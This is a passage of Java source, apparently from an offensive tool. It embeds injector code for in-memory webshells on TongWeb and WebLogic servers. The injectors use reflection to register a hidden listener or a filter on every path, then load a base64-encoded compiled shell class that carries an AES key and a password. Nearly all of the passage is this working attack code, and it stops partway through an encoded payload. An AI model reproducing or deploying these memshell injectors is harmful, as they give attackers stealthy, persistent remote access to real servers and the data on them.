                "                            if (flag == 0) {\n" +
                "                                Object[] elementData = (Object[]) getFV(processors, \"elementData\");\n" +
                "                                Object RequestO = getFV(elementData[0], \"req\");\n" +
                "                                RESPONSE = RequestO.getClass().getMethod(\"getResponse\", (Class[]) (new Class[0])).invoke(RequestO);\n" +
                "                                Method m2 = RequestO.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE);\n" +
                "                                m2.setAccessible(true);\n" +
                "                                Object v = m2.invoke(RequestO, 1);\n" +
                "                                try {\n" +
                "                                    STANDARD_CONTEXT = getFV(v, \"context\");\n" +
                "                                } catch (Exception e) {\n" +
                "                                    Method m3 = v.getClass().getSuperclass().getDeclaredMethod(\"getServletContext\");\n" +
                "                                    m3.setAccessible(true);\n" +
                "                                    Object AppContextFacade = m3.invoke(v);\n" +
                "                                    Object AppContext = getFV(AppContextFacade, \"context\");\n" +
                "                                    STANDARD_CONTEXT = getFV(AppContext, \"context\");\n" +
                "                                }\n" +
                "                                flag = 1;\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                } catch (Exception e) {\n" +
                "                }\n" +
                "\n" +
                "            }\n" +
                "\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    public static void injectMemShellClass() {\n" +
                "        try {\n" +
                "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();\n" +
                "        } catch (Exception var5) {\n" +
                "            try {\n" +
                "                String TongListenerBase64 = \"yv66vgAAADMBXwoAYgCzCQBGALQJAEYAtQgAtgkARgC3CAC4CQBGALkIALoJAEYAuwcAvAoACgCzCgAKAL0KAAoAvgoARgC/CQBGAMAIAMEJAEYAwgoAYgDDCgBiAMQIAMUKAMYAxwcAyAoAMQDJCgAWAMoKAMYAywoAxgDMBwDNCADOCgDPANAKADEA0QoAzwDSBwDTCgDPANQKACAA1QoAIADWCgAxANcIANgKAC4A2QgA2gcA2woALgDcBwDdCgDeAN8KADAA4AgA4QcA4gcAewcA4wcA5AgA5QoALgDmCADnCADoCADpCADqCADrCgDsAO0HAO4KAEYA7wgA8AsAOgDxCADyCgAxAPMLADoA9AsAOgD1CgBGAPYKAEYA9wgA+AsA+QD6BwD7CgAuAPwKAEYAwwoARgD9CwD5AP4IAP8LAGABAAgBAQsAOgD+BwECCgBPALMKADABAwsAYAEECgAxAQUKAQYBBwoAMAC+CgBPAQgKAEYBCQoAMQEKCAELCAEMCgAbAQ0IAGYKAC4BDgoBDwEQCgEPAREHARIKAC4BEwcBFAcBFQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAfTG1lbXNoZWxsL1RvbmdXZWJMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA+wcBFgcAzQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAOQBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHARcHAO4HARIHARgBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAFlAQAEdmFyMQEABHZhcjIBAApTb3VyY2VGaWxlAQAZVG9uZ1dlYkxpc3RlbmVyU2hlbGwuamF2YQwAbgBvDABkAGUMAGYAZwEAEDNjNmUwYjhhOWMxNTIyNGEMAGgAaQEABHBBUzMMAGoAaQEAEC9mYXZpY29uZGVtby5pY28MAGsAaQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEZARoMARsBHAwAbACJDABsAGkBAAVVVEYtOAwAbQBpDABuAHUMAR0BHgEAA0FFUwcBFgwBHwEgAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBIQEiDABuASMMASQBJQwBJgEnAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBKAwBHwEpDAEqASsMASwBLQEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAEuASIMAG4BLwwBGwEwDAExARwBABBqYXZhLnV0aWwuQmFzZTY0DAEyATMBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAE0ATUBABNbTGphdmEvbGFuZy9PYmplY3Q7BwE2DAE3ATgMATkBOgEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAE7ATwBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgcBFwwBPQE+AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAqgCrAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBPwCJAQAOWE1MSFRUUFJlcXVlc3QMAUABQQwBQgFDDAFEAIkMAJcAmAwAfAB9AQAQbWVtc2hlbGwucGF5bG9hZAcBGAwBRQFGAQAdbWVtc2hlbGwvVG9uZ1dlYkxpc3RlbmVyU2hlbGwMAUcBSAwAeAB5DAFJAUoBABd0ZXh0L2h0bWw7Y2hhcnNldD1VVEYtOAwBSwFMAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAFNAU4MAU8BUAwBUQFSBwFTDAFUAUwMAVUBIgwAjQCODAFRATABAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MMAVYAbwwBVwFYBwFZDAFaAVsMAVwBXQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDAFeAToBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEAC3RvQnl0ZUFycmF5AQAPcHJpbnRTdGFja1RyYWNlAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MAIQBGAGIAAQBjAAcAAQBkAGUAAAABAGYAZwAAAAAAaABpAAAAAQBqAGkAAAABAGsAaQAAAAAAbABpAAAAAQBtAGkAAAAKAAEAbgBvAAEAcAAAAJAAAwABAAAARiq3AAEqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJKrsAClm3AAsqtAAHtgAMKrQABbYADLYADbgADrUADyoSELUAEbEAAAACAHEAAAAmAAkAAAAbAAQAEwAJABQADgAVABQAFgAaABcAIAAcAD8AHQBFAB4AcgAAAAwAAQAAAEYAcwB0AAAAAQBuAHUAAQBwAAAAmwADAAIAAABHKiu3ABIqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJKrsAClm3AAsqtAAHtgAMKrQA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\";\n" +
                "                byte[] ListenerClass = base64Decode(TongListenerBase64);\n" +
                "                Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                "                defineClass1.setAccessible(true);\n" +
                "                Class listenerClass = (Class) defineClass1.invoke(Thread.currentThread().getContextClassLoader(), ListenerClass, 0, ListenerClass.length);\n" +
                "                MEMSHELL_OBJECT = listenerClass.newInstance();\n" +
                "            } catch (Exception var4) {\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "    }\n" +
                "    public static byte[] base64Decode(String bs) throws Exception {\n" +
                "        byte[] value = null;\n" +
                "\n" +
                "        Class base64;\n" +
                "        try {\n" +
                "            base64 = Class.forName(\"java.util.Base64\");\n" +
                "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
                "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
                "        } catch (Exception var6) {\n" +
                "            try {\n" +
                "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "                Object decoder = base64.newInstance();\n" +
                "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
                "            } catch (Exception var5) {\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        return value;\n" +
                "    }\n" +
                "    static {\n" +
                "        new TongWebListenerMemShell();\n" +
                "    }\n" +
                "}\n";

    public static final String WeblogicFilterMemShell =
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.*;\n" +
            "\n" +
            "public class WeblogicFilterMemShell{\n" +
            "    private static String filterName;\n" +
            "    private static String className = \"memshell.WeblogicFilterShell\";\n" +
            "\n" +
            "    public WeblogicFilterMemShell() {\n" +
            "        filterName = \"WeblogicFilterShell\";\n" +
            "        injectM();\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void injectM() {\n" +
            "        List var0 = getContext();\n" +
            "        Iterator var1 = var0.iterator();\n" +
            "        IMC();\n" +
            "        while(var1.hasNext()) {\n" +
            "            Object var2 = var1.next();\n" +
            "            IMF(var2);\n" +
            "        }\n" +
            "    }\n" +
            "    public static synchronized void IMF(Object var0) {\n" +
            "        try {\n" +
            "            Field var1 = var0.getClass().getDeclaredField(\"filterManager\");\n" +
            "            var1.setAccessible(true);\n" +
            "//            FilterManager var2 = (FilterManager) var1.get(var0);\n" +
            "            Object var2 =  var1.get(var0);\n" +
            "\n" +
            "            Method var3;\n" +
            "            try {\n" +
            "                var3 = var2.getClass().getDeclaredMethod(\"registerFilter\", String.class, String.class, String[].class, String[].class, Map.class);\n" +
            "                var3.setAccessible(true);\n" +
            "                var3.invoke(var2, filterName, className, new String[]{\"/*\"}, new String[0], new HashMap());\n" +
            "            } catch (Exception var8) {\n" +
            "                var3 = var2.getClass().getDeclaredMethod(\"registerFilter\", String.class, String.class, String[].class, String[].class, Map.class, String[].class);\n" +
            "                var3.setAccessible(true);\n" +
            "                var3.invoke(var2, filterName, className, new String[]{\"/*\"}, new String[0], new HashMap(), new String[0]);\n" +
            "            }\n" +
            "\n" +
            "            Field var4 = var2.getClass().getDeclaredField(\"filters\");\n" +
            "            var4.setAccessible(true);\n" +
            "            HashMap var5 = (HashMap) var4.get(var2);\n" +
            "//            FilterWrapper var6 = (FilterWrapper) var5.get(filterName);\n" +
            "            Object var6 = var5.get(filterName);\n" +
            "            Method var7 = var6.getClass().getDeclaredMethod(\"setHeadFilter\", Boolean.TYPE);\n" +
            "            var7.setAccessible(true);\n" +
            "            var7.invoke(var6, true);\n" +
            "\n" +
            "        } catch (Throwable var9) {\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized List<Object> getContext() {\n" +
            "        ArrayList var0 = new ArrayList();\n" +
            "\n" +
            "        try {\n" +
            "            Method var1 = Thread.class.getDeclaredMethod(\"getThreads\", (Class[])null);\n" +
            "            var1.setAccessible(true);\n" +
            "            Thread[] var2 = (Thread[])((Thread[])var1.invoke((Object)null));\n" +
            "            Thread[] var3 = var2;\n" +
            "            int var4 = var2.length;\n" +
            "\n" +
            "            for(int var5 = 0; var5 < var4; ++var5) {\n" +
            "                Thread var6 = var3[var5];\n" +
            "                if (var6.getClass().getName().contains(\"weblogic.timers.internal.TimerThread\")) {\n" +
            "                    try {\n" +
            "                        Object var7 = getFV(var6, \"timerThread\");\n" +
            "\n" +
            "                        Object var12;\n" +
            "                        Object var13;\n" +
            "                        Object var15;\n" +
            "                        Object var17;\n" +
            "                        try {\n" +
            "                            Object var8 = getFV(var7, \"timerTree\");\n" +
            "                            Map var21 = (Map)var8;\n" +
            "                            Iterator var22 = var21.entrySet().iterator();\n" +
            "\n" +
            "                            while(var22.hasNext()) {\n" +
            "                                Map.Entry var23 = (Map.Entry)var22.next();\n" +
            "                                var12 = var23.getValue();\n" +
            "                                var13 = getFV(var12, \"listener\");\n" +
            "                                if (var13.getClass().getName().contains(\"SessionContext\")) {\n" +
            "                                    Field var24 = var13.getClass().getDeclaredField(\"this$0\");\n" +
            "                                    var24.setAccessible(true);\n" +
            "                                    var15 = var24.get(var13);\n" +
            "                                    Field var25 = var15.getClass().getSuperclass().getDeclaredField(\"servletContext\");\n" +
            "                                    var25.setAccessible(true);\n" +
            "                                    var17 = var25.get(var15);\n" +
            "                                    var0.add(var17);\n" +
            "                                }\n" +
            "                            }\n" +
            "                        } catch (Exception var18) {\n" +
            "                            Object var9 = getFV(var7, \"managerList\");\n" +
            "                            List var10 = (List)var9;\n" +
            "                            Iterator var11 = var10.iterator();\n" +
            "\n" +
            "                            while(var11.hasNext()) {\n" +
            "                                var12 = var11.next();\n" +
            "                                if (var12.toString().contains(\"AsyncContextTimer-ContextPath=\")) {\n" +
            "                                    var13 = getFV(var12, \"timerSet\");\n" +
            "                                    Object var14 = getFV(var13, \"timers\");\n" +
            "                                    var15 = ((List)var14).get(0);\n" +
            "                                    Object var16 = getFV(var15, \"listener\");\n" +
            "                                    var17 = getFV(var16, \"context\");\n" +
            "                                    var0.add(var17);\n" +
            "                                }\n" +
            "                            }\n" +
            "                        }\n" +
            "                    } catch (Exception var19) {\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception var20) {\n" +
            "        }\n" +
            "\n" +
            "        return var0;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMC() {\n" +
            "\n" +
            "        try {\n" +
            "            Thread.currentThread().getContextClassLoader().loadClass(\"memshell.WeblogicFilterShell\");\n" +
            "        } catch (Exception var4) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 =base64Decode(\"yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTG1lbXNoZWxsL1dlYmxvZ2ljRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAYV2VibG9naWNGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlY